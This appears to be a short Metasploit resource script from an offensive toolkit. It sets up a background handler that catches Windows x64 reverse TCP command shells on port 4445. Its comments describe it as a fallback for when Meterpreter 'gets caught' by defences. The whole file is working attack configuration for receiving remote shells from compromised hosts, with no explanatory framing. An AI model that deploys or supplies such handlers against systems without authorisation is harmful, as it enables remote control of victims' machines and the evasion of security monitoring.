# Windows CMD Shell Reverse TCP Handler
# Port: 4445
# Use when: Meterpreter gets caught or acts weird
# Requires: LHOST set globally via setup_msf_from_auto_recon.sh

use exploit/multi/handler
set PAYLOAD windows/x64/shell_reverse_tcp
set LPORT 4445
set ExitOnSession false

echo "[*] Starting Windows x64 CMD shell handler on ${LHOST}:4445"
run -j
